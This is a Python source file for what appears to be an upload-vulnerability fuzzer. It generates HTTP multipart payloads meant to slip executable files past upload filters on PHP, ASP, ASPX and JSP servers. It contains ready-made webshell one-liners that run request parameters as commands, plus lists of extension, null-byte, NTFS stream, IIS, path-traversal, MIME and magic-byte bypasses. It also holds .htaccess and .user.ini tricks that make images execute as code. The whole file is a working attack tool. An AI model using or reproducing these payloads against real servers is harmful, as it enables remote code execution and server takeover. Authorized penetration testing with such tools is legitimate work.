#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Intruder Payload Generator - 文件上传漏洞Payload生成引擎

从 Upload_Auto_Fuzz.py 提取的核心Payload生成引擎
支持策略模式的Payload生成，可独立运行或集成到GUI

架构:
    - Strategy Pattern: 每个绕过技术封装为FuzzStrategy
    - Factory Pattern: PayloadFactory管理策略注册和payload生成
    - Template Method: 基类定义生成骨架，子类实现具体逻辑

支持的目标语言: PHP, ASP, ASPX, JSP
覆盖的绕过技术: 14+ 种核心策略 + 新增的高级绕过

Author: Integrated from Upload_Auto_Fuzz.py
Version: 1.1.1
License: MIT
"""

import re
import base64
import hashlib
from abc import ABCMeta, abstractmethod
from typing import List, Dict, Generator, Optional, Set


# =============================================================================
# Constants and Configuration
# =============================================================================

VERSION = "1.1.1"
MAX_PAYLOADS_DEFAULT = 2000
MAX_FILENAME_LENGTH = 255


# Supported backend languages with their executable extensions
BACKEND_LANGUAGES = {
    'php': ['php', 'php3', 'php4', 'php5', 'php7', 'php8', 'phtml', 'pht', 'phpt', 'phar', 'pgif'],
    'asp': ['asp', 'asa', 'cer', 'cdx', 'htr'],
    'aspx': ['aspx', 'ashx', 'asmx', 'asax'],
    'jsp': ['jsp', 'jspa', 'jsps', 'jspx', 'jspf'],
}

# Common image MIME types for bypass
IMAGE_MIME_TYPES = [
    'image/jpeg', 'image/png', 'image/gif', 'image/bmp',
    'image/webp', 'image/svg+xml', 'image/tiff'
]

# Magic bytes for file type spoofing
MAGIC_BYTES = {
    'jpg': b'\xff\xd8\xff\xe0',
    'png': b'\x89PNG\r\n\x1a\n',
    'gif': b'GIF89a',
    'gif87': b'GIF87a',
    'bmp': b'BM',
    'pdf': b'%PDF-1.5',
    'zip': b'PK\x03\x04',
}

# WebShell templates for different languages
WEBSHELL_TEMPLATES = {
    'php': [
        '<?php eval($_POST["cmd"]); ?>',
        '<?php system($_REQUEST["cmd"]); ?>',
        '<?= `$_GET[0]`; ?>',
        '<?php $_GET[a]($_GET[b]); ?>',
        '<?php @eval($_POST["cmd"]); ?>',
        '<?php assert($_POST["cmd"]); ?>',
    ],
    'asp': [
        '<%eval request("cmd")%>',
        '<%execute request("cmd")%>',
        '<%execute(request("cmd"))%>',
    ],
    'aspx': [
        '<%@ Page Language="C#" %><%System.Diagnostics.Process.Start("cmd.exe","/c "+Request["cmd"]);%>',
        '<%@ Page Language="C#" %><%eval(Request["cmd"]);%>',
    ],
    'jsp': [
        '<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>',
        '<%=Runtime.getRuntime().exec(request.getParameter("cmd"))%>',
        '<%Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));%>',
    ],
}


# =============================================================================
# Utility Functions
# =============================================================================

def safe_url_decode(encoded_str: str) -> str:
    """
    Safely decode URL-encoded string.
    
    Args:
        encoded_str: URL-encoded string (e.g., '%00', '%20')
    
    Returns:
        Decoded string
    """
    result = []
    i = 0
    while i < len(encoded_str):
        if encoded_str[i] == '%' and i + 2 < len(encoded_str):
            try:
                hex_val = encoded_str[i+1:i+3]
                result.append(chr(int(hex_val, 16)))
                i += 3
            except ValueError:
                result.append(encoded_str[i])
                i += 1
        else:
            result.append(encoded_str[i])
            i += 1
    return ''.join(result)


def compute_payload_hash(payload: str) -> str:
    """
    Compute a unique hash for payload deduplication.
    
    Args:
        payload: The payload string
    
    Returns:
        MD5 hash string of the payload
    """
    if isinstance(payload, bytes):
        payload = payload.decode('utf-8')
    return hashlib.md5(payload.encode('utf-8')).hexdigest()


def safe_regex_search(pattern: str, text: str, default=None):
    """
    Safely perform regex search with error handling.
    
    Args:
        pattern: Regex pattern string
        text: Text to search in
        default: Default value if no match found
    
    Returns:
        Match object or default value
    """
    try:
        match = re.search(pattern, text, re.DOTALL)
        return match if match else default
    except re.error:
        return default


def extract_filename_parts(template: str):
    """
    Extract filename and extension from Content-Disposition header.
    
    Args:
        template: HTTP request template containing Content-Disposition
    
    Returns:
        Tuple of (full_filename, extension, filename_match_group)
        Returns (None, None, None) if extraction fails
    """
    # Try different filename patterns
    patterns = [
        r'filename="([^"]+)"',      # Standard: filename="test.jpg"
        r"filename='([^']+)'",      # Single quotes: filename='test.jpg'
        r'filename=([^\s;]+)',      # No quotes: filename=test.jpg
    ]
    
    for pattern in patterns:
        match = safe_regex_search(pattern, template)
        if match:
            filename = match.group(1)
            if '.' in filename:
                ext = filename.rsplit('.', 1)[-1]
                return filename, ext, match.group(0)
            return filename, '', match.group(0)
    
    return None, None, None


def extract_content_type(template: str) -> Optional[str]:
    """
    Extract Content-Type value from template.
    
    Args:
        template: HTTP request template
    
    Returns:
        Content-Type string or None
    """
    match = safe_regex_search(r'Content-Type:\s*([^\r\n]+)', template)
    return match.group(1).strip() if match else None


# =============================================================================
# Payload Generation Configuration
# =============================================================================

class FuzzConfig:
    """
    Configuration container for payload generation.
    Implements Singleton pattern for global access within a session.
    """
    
    _instance = None
    
    def __new__(cls, force_new=False):
        """
        Create or return singleton instance.
        
        Args:
            force_new: If True, create a new instance (for testing)
        """
        if cls._instance is None or force_new:
            cls._instance = object.__new__(cls)
            cls._instance._initialized = False
        return cls._instance
    
    def __init__(self, force_new=False):
        if self._initialized and not force_new:
            return
        
        # Target languages to test (default: all)
        self.target_languages = ['php', 'asp', 'aspx', 'jsp']
        
        # Enabled strategy categories (default: all enabled)
        self.enabled_strategies = {
            'suffix': True,
            'content_disposition': True,
            'content_type': True,
            'windows_features': True,
            'linux_features': True,
            'magic_bytes': True,
            'null_byte': True,
            'double_extension': True,
            'case_variation': True,
            'special_chars': True,
            'encoding': True,
            'waf_bypass': True,
            'webshell_content': True,
            'config_files': True,
            # 新增策略
            'race_condition': True,
            'array_bypass': True,
            'double_dot': True,
        }
        
        # Maximum payloads to generate (default: 2000)
        self.max_payloads = MAX_PAYLOADS_DEFAULT
        
        # Include webshell content in payloads
        self.include_webshell = True
        
        self._initialized = True
    
    @classmethod
    def reset(cls):
        """Reset the singleton instance (useful for testing)."""
        cls._instance = None
    
    def set_target_languages(self, languages: List[str]):
        """Set target backend languages."""
        valid_langs = [l for l in languages if l in BACKEND_LANGUAGES]
        if valid_langs:
            self.target_languages = valid_langs
    
    def enable_strategy(self, strategy_name: str, enabled: bool = True):
        """Enable or disable a specific strategy."""
        if strategy_name in self.enabled_strategies:
            self.enabled_strategies[strategy_name] = enabled
    
    def is_strategy_enabled(self, strategy_name: str) -> bool:
        """Check if a strategy is enabled."""
        return self.enabled_strategies.get(strategy_name, False)


# =============================================================================
# Abstract Base Strategy
# =============================================================================

class FuzzStrategy:
    """
    Abstract base class for all fuzzing strategies.
    
    Each strategy encapsulates a specific bypass technique and generates
    payloads accordingly. Strategies are designed to be composable and
    independently testable.
    """
    
    __metaclass__ = ABCMeta
    
    # Strategy metadata
    name = "base"
    description = "Base fuzzing strategy"
    category = "general"
    
    def __init__(self, config: FuzzConfig = None):
        """
        Initialize strategy with configuration.
        
        Args:
            config: FuzzConfig instance or None for default
        """
        self.config = config or FuzzConfig()
    
    @abstractmethod
    def generate(self, template: str, filename: str, extension: str, content_type: str):
        """
        Generate payloads for this strategy.
        
        Args:
            template: Original HTTP request template
            filename: Original filename (e.g., "test.jpg")
            extension: Original file extension (e.g., "jpg")
            content_type: Original Content-Type value
        
        Yields:
            Modified template strings as payloads
        """
        pass
    
    def _replace_filename(self, template: str, old_filename_match: str, new_filename: str) -> str:
        """
        Helper to replace filename in template.
        
        Args:
            template: Original template
            old_filename_match: The matched filename string (e.g., 'filename="test.jpg"')
            new_filename: New filename to use
        
        Returns:
            Modified template string
        """
        new_match = 'filename="{}"'.format(new_filename)
        return template.replace(old_filename_match, new_match)
    
    def _replace_content_type(self, template: str, old_ct: str, new_ct: str) -> str:
        """
        Helper to replace Content-Type in template.
        
        Args:
            template: Original template
            old_ct: Old Content-Type value
            new_ct: New Content-Type value
        
        Returns:
            Modified template string
        """
        return template.replace(
            'Content-Type: {}'.format(old_ct),
            'Content-Type: {}'.format(new_ct)
        )
    
    def _get_target_extensions(self) -> List[str]:
        """Get list of target extensions based on configured languages."""
        extensions = []
        for lang in self.config.target_languages:
            if lang in BACKEND_LANGUAGES:
                extensions.extend(BACKEND_LANGUAGES[lang])
        return list(set(extensions))


# =============================================================================
# Concrete Fuzzing Strategies
# =============================================================================

class SuffixBypassStrategy(FuzzStrategy):
    """
    Strategy for file extension/suffix bypass techniques.
    
    Techniques include:
    - Alternative executable extensions
    - Case variations
    - Null byte injection
    - Double extensions
    - Special character injection
    """
    
    name = "suffix"
    description = "File extension bypass techniques"
    category = "suffix"
    
    # Extension bypass patterns: {language: [bypass_patterns]}
    BYPASS_PATTERNS = {
        'php': [
            # Alternative extensions
            'php3', 'php4', 'php5', 'php7', 'php8', 'phtml', 'pht', 'phar', 'phps',
            'php1', 'php2', 'pgif', 'pht', 'phpt',
            # Case variations
            'pHp', 'PhP', 'PHP', 'pHP', 'PHp', 'phP',
            # 双写绕过
            'pphphp', 'phphpp', 'pphp',
            # Null byte variations
            'php%00', 'php%00.jpg', 'php\x00.jpg',
            # Double extensions
            'php.jpg', 'php.png', 'php.gif', 'jpg.php', 'png.php',
            # Special characters
            'php ', 'php.', 'php..', 'php::$DATA', 'php:$DATA',
            # Semicolon bypass (IIS)
            'php;.jpg', 'php;jpg', 'php;.png',
            # Path separator tricks
            'php/.jpg', 'php\\.jpg',
            # Encoding tricks
            'p%68p', '%70hp', 'ph%70',
            # 文件名中间插入特殊字符
            'p;hp', 'p hp', 'ph p', 'p.hp',
            # 双点payload
            'p.hp', 'p..hp',
        ],
        'asp': [
            'asa', 'cer', 'cdx', 'htr',
            'asp ', 'asp.', 'asp;.jpg', 'asp;jpg',
            'asp%00', 'asp%00.jpg', 'asp::$DATA',
            'aSp', 'AsP', 'ASP', 'aSP', 'Asp',
            # 双写绕过
            'aspasp', 'aasps', 'aspas',
            # 文件名中间插入特殊字符
            'a;sp', 'as p', 'a.sp',
        ],
        'aspx': [
            'ashx', 'asmx', 'asax', 'ascx', 'soap', 'rem', 'axd',
            'aspx ', 'aspx.', 'aspx;.jpg',
            'aSpX', 'ASPX', 'AsPx', 'ASpx', 'aspX',
            # 双写绕过
            'aspxaspx', 'aaspxspx',
        ],
        'jsp': [
            'jspa', 'jsps', 'jspx', 'jspf', 'jsw', 'jsv', 'jtml',
            'jsp ', 'jsp.', 'jsp;.jpg',
            'jSp', 'JsP', 'JSP', 'jSP', 'Jsp',
            'jsp%00', 'jsp%00.jpg',
            # 双写绕过
            'jspjsp', 'jjsps',
        ],
    }
    
    def generate(self, template: str, filename: str, extension: str, content_type: str):
        """Generate suffix bypass payloads."""
        _, _, filename_match = extract_filename_parts(template)
        if not filename_match:
            return
        
        base_name = filename.rsplit('.', 1)[0] if '.' in filename else filename
        generated = set()
        
        for lang in self.config.target_languages:
            if lang not in self.BYPASS_PATTERNS:
                continue
            
            for pattern in self.BYPASS_PATTERNS[lang]:
                new_filename = "{}.{}".format(base_name, pattern)
                
                # Skip if already generated
                if new_filename in generated:
                    continue
                generated.add(new_filename)
                
                # Truncate if too long
                if len(new_filename) > MAX_FILENAME_LENGTH:
                    continue
                
                yield self._replace_filename(template, filename_match, new_filename)


class ContentDispositionStrategy(FuzzStrategy):
    """
    Strategy for Content-Disposition header manipulation.
    """
    
    name = "content_disposition"
    description = "Content-Disposition header bypass techniques"
    category = "content_disposition"
    
    def generate(self, template: str, filename: str, extension: str, content_type: str):
        """Generate Content-Disposition bypass payloads."""
        _, _, filename_match = extract_filename_parts(template)
        if not filename_match:
            return
        
        base_name = filename.rsplit('.', 1)[0] if '.' in filename else filename
        
        for lang in self.config.target_languages:
            ext = BACKEND_LANGUAGES[lang][0]  # Primary extension
            
            # Case variations for Content-Disposition
            cd_variations = [
                ('Content-Disposition', 'content-disposition'),
                ('Content-Disposition', 'CONTENT-DISPOSITION'),
                ('Content-Disposition', 'Content-disposition'),
                ('Content-Disposition', 'ConTENT-DisPoSition'),
                ('Content-Disposition: ', 'Content-Disposition:'),
                ('Content-Disposition: ', 'Content-Disposition:  '),
                ('Content-Disposition: ', 'Content-Disposition:\t'),
            ]
            
            for old, new in cd_variations:
                if old in template:
                    modified = template.replace(old, new)
                    modified = self._replace_filename(modified, filename_match, 
                                                     "{}.{}".format(base_name, ext))
                    yield modified
            
            # form-data variations
            fd_variations = [
                ('form-data', 'Form-Data'),
                ('form-data', 'FORM-DATA'),
                ('form-data', 'form-Data'),
                ('form-data', 'form-datA'),
                ('form-data; ', 'form-data;'),
                ('form-data; ', 'form-data;  '),
                ('form-data', '*'),
                ('form-data', 'f+orm-data'),
                ('form-data', 'AAAA="BBBB"'),
                ('form-data; ', ''),
                ('form-data;', 'form-data;;;;;;;;;;'),
            ]
            
            for old, new in fd_variations:
                if old in template:
                    modified = template.replace(old, new)
                    modified = self._replace_filename(modified, filename_match,
                                                     "{}.{}".format(base_name, ext))
                    yield modified
            
            # Filename parameter variations
            filename_variations = [
                'filename={}.{}'.format(base_name, ext),
                "filename='{}.{}'".format(base_name, ext),
                'filename=`{}.{}`'.format(base_name, ext),
                'filename="{}.{}'.format(base_name, ext),
                "filename='{}.{}".format(base_name, ext),
                'filename="{}.{}\''.format(base_name, ext),
                'filename=="{}.{}"'.format(base_name, ext),
                'filename==="{}.{}"'.format(base_name, ext),
                'filename="{}.{}"\n'.format(base_name, ext),
                'filename="safe.jpg"; filename="{}.{}"'.format(base_name, ext),
                'filename="{}.{}"; filename="safe.jpg"'.format(base_name, ext),
            ]
            
            for variation in filename_variations:
                yield template.replace(filename_match, variation)


class ContentTypeStrategy(FuzzStrategy):
    """Strategy for Content-Type header manipulation."""
    
    name = "content_type"
    description = "Content-Type header bypass techniques"
    category = "content_type"
    
    MIME_TYPES = [
        'image/jpeg', 'image/png', 'image/gif', 'image/bmp',
        'image/webp', 'image/svg+xml', 'image/tiff',
        'text/plain', 'text/html',
        'application/octet-stream',
        'application/x-httpd-php',
        'application/x-php',
        'image/php',
        'image/asp',
        'image/aspx',
        'image/jsp',
    ]
    
    def generate(self, template: str, filename: str, extension: str, content_type: str):
        """Generate Content-Type bypass payloads."""
        if not content_type:
            return
        
        _, _, filename_match = extract_filename_parts(template)
        if not filename_match:
            return
        
        base_name = filename.rsplit('.', 1)[0] if '.' in filename else filename
        
        for lang in self.config.target_languages:
            ext = BACKEND_LANGUAGES[lang][0]
            
            modified_template = self._replace_filename(template, filename_match,
                                                       "{}.{}".format(base_name, ext))
            
            for mime in self.MIME_TYPES:
                yield self._replace_content_type(modified_template, content_type, mime)
            
            # Empty Content-Type
            yield modified_template.replace('Content-Type: {}'.format(content_type), '')


class WindowsFeaturesStrategy(FuzzStrategy):
    """Strategy exploiting Windows filesystem features."""
    
    name = "windows_features"
    description = "Windows filesystem bypass techniques"
    category = "windows_features"
    
    RESERVED_NAMES = ['con', 'aux', 'nul', 'prn', 'com1', 'com2', 'lpt1', 'lpt2']
    
    def generate(self, template: str, filename: str, extension: str, content_type: str):
        """Generate Windows-specific bypass payloads."""
        _, _, filename_match = extract_filename_parts(template)
        if not filename_match:
            return
        
        base_name = filename.rsplit('.', 1)[0] if '.' in filename else filename
        
        for lang in self.config.target_languages:
            ext = BACKEND_LANGUAGES[lang][0]
            
            # NTFS ADS patterns
            ads_patterns = [
                '{}.{}::$DATA'.format(base_name, ext),
                '{}.{}::$DATA......'.format(base_name, ext),
                '{}:{}'.format(base_name, ext),
            ]
            
            for pattern in ads_patterns:
                yield self._replace_filename(template, filename_match, pattern)
            
            # IIS semicolon bypass
            iis_patterns = [
                '{}.{};.jpg'.format(base_name, ext),
                '{}.{};.png'.format(base_name, ext),
            ]
            
            for pattern in iis_patterns:
                yield self._replace_filename(template, filename_match, pattern)
            
            # Trailing dots and spaces
            trailing_patterns = [
                '{}.{}.'.format(base_name, ext),
                '{}.{}..'.format(base_name, ext),
                '{}.{} '.format(base_name, ext),
            ]
            
            for pattern in trailing_patterns:
                yield self._replace_filename(template, filename_match, pattern)


class LinuxFeaturesStrategy(FuzzStrategy):
    """Strategy exploiting Linux/Unix filesystem features."""
    
    name = "linux_features"
    description = "Linux/Unix filesystem bypass techniques"
    category = "linux_features"
    
    def generate(self, template: str, filename: str, extension: str, content_type: str):
        """Generate Linux-specific bypass payloads."""
        _, _, filename_match = extract_filename_parts(template)
        if not filename_match:
            return
        
        base_name = filename.rsplit('.', 1)[0] if '.' in filename else filename
        
        for lang in self.config.target_languages:
            ext = BACKEND_LANGUAGES[lang][0]
            
            # Apache multi-extension
            apache_patterns = [
                '{}.{}.jpg'.format(base_name, ext),
                '{}.{}.png'.format(base_name, ext),
                '{}.jpg.{}'.format(base_name, ext),
            ]
            
            for pattern in apache_patterns:
                yield self._replace_filename(template, filename_match, pattern)
            
            # Path traversal
            traversal_patterns = [
                '../{}.{}'.format(base_name, ext),
                '../../{}.{}'.format(base_name, ext),
                '..../{}.{}'.format(base_name, ext),
            ]
            
            for pattern in traversal_patterns:
                yield self._replace_filename(template, filename_match, pattern)


class MagicBytesStrategy(FuzzStrategy):
    """Strategy for file magic bytes/signature spoofing."""
    
    name = "magic_bytes"
    description = "File magic bytes spoofing"
    category = "magic_bytes"
    
    def generate(self, template: str, filename: str, extension: str, content_type: str):
        """Generate magic bytes spoofing payloads."""
        _, _, filename_match = extract_filename_parts(template)
        if not filename_match:
            return
        
        base_name = filename.rsplit('.', 1)[0] if '.' in filename else filename
        
        content_match = safe_regex_search(r'Content-Type:[^\r\n]*\r\n\r\n', template)
        if not content_match:
            return
        
        content_marker = content_match.group(0)
        
        for lang in self.config.target_languages:
            ext = BACKEND_LANGUAGES[lang][0]
            
            modified = self._replace_filename(template, filename_match,
                                             "{}.{}".format(base_name, ext))
            
            for magic_name, magic_bytes in MAGIC_BYTES.items():
                payload = modified.replace(content_marker, 
                                          content_marker + magic_bytes.decode('latin-1'))
                yield payload


class NullByteStrategy(FuzzStrategy):
    """Strategy for null byte injection attacks."""
    
    name = "null_byte"
    description = "Null byte injection techniques"
    category = "null_byte"
    
    NULL_VARIANTS = [
        '%00', '\\0', '\\x00', '\x00',
        '%2500',
        '%u0000',
    ]
    
    def generate(self, template: str, filename: str, extension: str, content_type: str):
        """Generate null byte injection payloads."""
        _, _, filename_match = extract_filename_parts(template)
        if not filename_match:
            return
        
        base_name = filename.rsplit('.', 1)[0] if '.' in filename else filename
        
        for lang in self.config.target_languages:
            ext = BACKEND_LANGUAGES[lang][0]
            
            for null in self.NULL_VARIANTS:
                patterns = [
                    '{}.{}{}.jpg'.format(base_name, ext, null),
                    '{}.{}{}jpg'.format(base_name, ext, null),
                    '{}{}.{}'.format(base_name, null, ext),
                ]
                
                for pattern in patterns:
                    yield self._replace_filename(template, filename_match, pattern)


class ConfigFileStrategy(FuzzStrategy):
    """Strategy for uploading configuration files."""
    
    name = "config_files"
    description = "Configuration file upload techniques"
    category = "config_files"
    
    CONFIG_FILES = [
        '.htaccess',
        '.user.ini',
        'web.config',
        '.php.ini',
        'php.ini',
    ]
    
    CONFIG_CONTENTS = {
        '.htaccess': [
            'SetHandler application/x-httpd-php',
            'AddType application/x-httpd-php .jpg',
            'AddType application/x-httpd-php .png',
        ],
        '.user.ini': [
            'auto_prepend_file=shell.gif',
            'auto_prepend_file=1.gif',
            'auto_append_file=shell.gif',
        ],
    }
    
    def generate(self, template: str, filename: str, extension: str, content_type: str):
        """Generate config file upload payloads."""
        _, _, filename_match = extract_filename_parts(template)
        if not filename_match:
            return
        
        for config_file in self.CONFIG_FILES:
            yield self._replace_filename(template, filename_match, config_file)


class WebShellContentStrategy(FuzzStrategy):
    """Strategy for injecting webshell content into uploads."""
    
    name = "webshell_content"
    description = "WebShell content injection"
    category = "webshell_content"
    
    def generate(self, template: str, filename: str, extension: str, content_type: str):
        """Generate webshell content payloads."""
        if not self.config.include_webshell:
            return
        
        _, _, filename_match = extract_filename_parts(template)
        if not filename_match:
            return
        
        base_name = filename.rsplit('.', 1)[0] if '.' in filename else filename
        
        content_match = safe_regex_search(
            r'(Content-Type:[^\r\n]*\r\n\r\n)(.*?)(?:\r\n--|\Z)', 
            template, 
        )
        
        if not content_match:
            return
        
        content_header = content_match.group(1)
        original_content = content_match.group(2)
        
        for lang in self.config.target_languages:
            if lang not in WEBSHELL_TEMPLATES:
                continue
            
            ext = BACKEND_LANGUAGES[lang][0]
            
            modified = self._replace_filename(template, filename_match,
                                             "{}.{}".format(base_name, ext))
            
            for webshell in WEBSHELL_TEMPLATES[lang]:
                if original_content:
                    payload = modified.replace(original_content, webshell)
                else:
                    payload = modified.replace(content_header, content_header + webshell)
                
                yield payload


class DoubleDotStrategy(FuzzStrategy):
    """Strategy for double/multi dot bypass techniques."""
    
    name = "double_dot"
    description = "Double dot bypass techniques"
    category = "double_dot"
    
    def generate(self, template: str, filename: str, extension: str, content_type: str):
        """Generate double dot bypass payloads."""
        _, _, filename_match = extract_filename_parts(template)
        if not filename_match:
            return
        
        base_name = filename.rsplit('.', 1)[0] if '.' in filename else filename
        
        for lang in self.config.target_languages:
            ext = BACKEND_LANGUAGES[lang][0]
            
            patterns = [
                '{}..{}'.format(base_name, ext),       # shell..php
                '{}...{}'.format(base_name, ext),      # shell...php
                '{}....{}'.format(base_name, ext),     # shell....php
                '{}.{}..'.format(base_name, ext),      # shell.php..
                '{}.{}...'.format(base_name, ext),     # shell.php...
            ]
            
            for pattern in patterns:
                yield self._replace_filename(template, filename_match, pattern)


# =============================================================================
# Payload Factory
# =============================================================================

class PayloadFactory:
    """
    Factory class for managing and executing fuzzing strategies.
    
    Responsibilities:
    - Strategy registration and management
    - Coordinated payload generation
    - Deduplication and limiting
    """
    
    def __init__(self, config: FuzzConfig = None):
        """
        Initialize the factory with configuration.
        
        Args:
            config: FuzzConfig instance or None for default
        """
        self.config = config or FuzzConfig()
        self._strategies = {}
        self._register_default_strategies()
    
    def _register_default_strategies(self):
        """Register all built-in strategies."""
        default_strategies = [
            SuffixBypassStrategy,
            ContentDispositionStrategy,
            ContentTypeStrategy,
            WindowsFeaturesStrategy,
            LinuxFeaturesStrategy,
            MagicBytesStrategy,
            NullByteStrategy,
            ConfigFileStrategy,
            WebShellContentStrategy,
            DoubleDotStrategy,
        ]
        
        for strategy_class in default_strategies:
            self.register_strategy(strategy_class)
    
    def register_strategy(self, strategy_class):
        """
        Register a new strategy.
        
        Args:
            strategy_class: Class inheriting from FuzzStrategy
        """
        strategy = strategy_class(self.config)
        self._strategies[strategy.name] = strategy
    
    def unregister_strategy(self, name: str):
        """
        Unregister a strategy by name.
        
        Args:
            name: Strategy name to remove
        """
        if name in self._strategies:
            del self._strategies[name]
    
    def get_strategy(self, name: str):
        """
        Get a strategy by name.
        
        Args:
            name: Strategy name
        
        Returns:
            FuzzStrategy instance or None
        """
        return self._strategies.get(name)
    
    def list_strategies(self) -> List[tuple]:
        """
        List all registered strategies.
        
        Returns:
            List of (name, description) tuples
        """
        return [(s.name, s.description) for s in self._strategies.values()]
    
    def generate_payloads(self, template: str) -> List[str]:
        """
        Generate all payloads for a given template.
        
        This is the main entry point for payload generation. It:
        1. Parses the template to extract filename and content-type
        2. Runs all enabled strategies
        3. Deduplicates results
        4. Limits to max_payloads
        
        Args:
            template: HTTP request template string
        
        Returns:
            List of unique payload strings
        """
        # Parse template
        filename, extension, _ = extract_filename_parts(template)
        content_type = extract_content_type(template)
        
        if not filename:
            return [template]  # Return original as fallback
        
        # Collect payloads from all enabled strategies
        seen_hashes: Set[str] = set()
        payloads: List[str] = []
        
        for name, strategy in self._strategies.items():
            if not self.config.is_strategy_enabled(strategy.category):
                continue
            
            try:
                for payload in strategy.generate(template, filename, extension, content_type):
                    if payload is None:
                        continue
                    
                    # Deduplicate using hash
                    payload_hash = compute_payload_hash(payload)
                    if payload_hash in seen_hashes:
                        continue
                    
                    seen_hashes.add(payload_hash)
                    payloads.append(payload)
                    
                    # Check limit
                    if len(payloads) >= self.config.max_payloads:
                        return payloads
                        
            except Exception as e:
                continue
        
        return payloads


# =============================================================================
# Convenience Functions
# =============================================================================

def generate_intruder_payloads(template: str, languages: List[str] = None, 
                               max_payloads: int = MAX_PAYLOADS_DEFAULT) -> List[str]:
    """
    Convenience function to generate intruder payloads.
    
    Args:
        template: HTTP request template string
        languages: List of target languages (default: all)
        max_payloads: Maximum number of payloads to generate
    
    Returns:
        List of payload strings
    """
    config = FuzzConfig(force_new=True)
    if languages:
        config.set_target_languages(languages)
    config.max_payloads = max_payloads
    
    factory = PayloadFactory(config)
    return factory.generate_payloads(template)


def get_payload_statistics() -> Dict:
    """
    Get statistics about available payloads.
    
    Returns:
        Dictionary with payload statistics
    """
    config = FuzzConfig(force_new=True)
    factory = PayloadFactory(config)
    
    return {
        'total_strategies': len(factory._strategies),
        'strategies': factory.list_strategies(),
        'languages': list(BACKEND_LANGUAGES.keys()),
        'max_payloads': MAX_PAYLOADS_DEFAULT,
    }


# =============================================================================
# Standalone Testing
# =============================================================================

if __name__ == "__main__":
    print("UploadRanger Intruder Payload Generator v{}".format(VERSION))
    print("=" * 60)
    
    # Sample template
    template = '''POST /upload.php HTTP/1.1
Host: example.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="test.jpg"
Content-Type: image/jpeg

[binary content]
------WebKitFormBoundary--'''
    
    # Generate payloads
    payloads = generate_intruder_payloads(template, languages=['php'], max_payloads=50)
    
    print("\nGenerated {} payloads:".format(len(payloads)))
    for i, payload in enumerate(payloads[:10]):
        print("\n--- Payload {} ---".format(i + 1))
        # Show only filename change
        if 'filename=' in payload:
            match = re.search(r'filename="([^"]+)"', payload)
            if match:
                print("Filename: {}".format(match.group(1)))
    
    if len(payloads) > 10:
        print("\n... and {} more payloads".format(len(payloads) - 10))
    
    # Show statistics
    stats = get_payload_statistics()
    print("\n\nStatistics:")
    print("  Total strategies: {}".format(stats['total_strategies']))
    print("  Supported languages: {}".format(', '.join(stats['languages'])))
